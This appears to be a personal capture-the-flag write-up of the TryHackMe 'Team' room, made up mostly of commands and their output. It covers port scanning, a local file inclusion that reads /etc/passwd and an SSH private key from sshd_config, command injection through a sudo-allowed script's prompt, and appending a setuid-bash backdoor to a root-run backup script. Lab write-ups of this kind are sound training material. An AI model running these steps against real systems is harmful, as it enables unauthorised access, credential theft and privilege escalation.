## Team
https://tryhackme.com/room/teamcw

## Enum
```
nmap -Pn -sC -sS -sV ip.thm -p 21,22,80 -A

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X (88%)
OS CPE: cpe:/o:linux:linux_kernel:4.2
Aggressive OS guesses: Linux 4.2 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
![image](https://user-images.githubusercontent.com/6504854/194690167-ffe29242-bf93-42a1-b0b9-35d288856d35.png)

🚩 Hint: dev 

```
echo 10.10.250.37 team.thm >> /etc/hosts
echo 10.10.250.37 dev.team.thm >> /etc/hosts
```

```
curl http://dev.team.thm/                                 

<html>
 <head>
  <title>UNDER DEVELOPMENT</title>
 </head>
 <body>
  Site is being built<a href=script.php?page=teamshare.php </a>
<p>Place holder link to team share</p>
 </body>
</html>
                                                                                                
curl http://dev.team.thm/script.php?page=teamshare.php

<html>
 <head>
  <title>Team Share</title>
 </head>
 <body>
  Place holder for future team share </body>
</html>
```

```
curl http://dev.team.thm/script.php?page=../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
```

🚩 ffuf scaned via LFI list and found ssh_conf files. 

page=/home/dale/.ssh/id_rsa and page=/home/gyles/.ssh/id_rsa couldn't find ssh keys 😞

```
curl http://dev.team.thm/script.php?page=/etc/ssh/sshd_config

#       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
~~~
#CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
#-----END OPENSSH PRIVATE KEY-----

```
🚩 Copy + paste the key and remove # (commented). Save as id_rsa and chmod 600 id_rsa.

## Flag

```
ssh -i id_rsa dale@10.10.250.37

```
![image](https://user-images.githubusercontent.com/6504854/194691494-f6a176f1-a727-4a34-a069-5f59ab57f157.png)

```
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

```
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: data
Enter 'date' to timestamp the file: /bin/sh -i
The Date is id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)

gyles@TEAM:/opt/admin_stuff$ find / -group admin 2>/dev/null
/usr/local/bin
/usr/local/bin/main_backup.sh
/opt/admin_stuff

gyles@TEAM:~$ echo "cp -p /bin/bash /tmp/sh && chmod u+s /tmp/sh" >> /usr/local/bin/main_backup.sh

gyles@TEAM:~$ ls -la /tmp/sh
-rwsr-xr-x 1 root root 1113504 Oct  8 07:46 /tmp/sh

gyles@TEAM:/tmp/sh -p

sh-4.4# cat /root/root.txt
sh-4.4# THM{f************}
```

㊗️ はらへった　🥓🥓🥓🥓


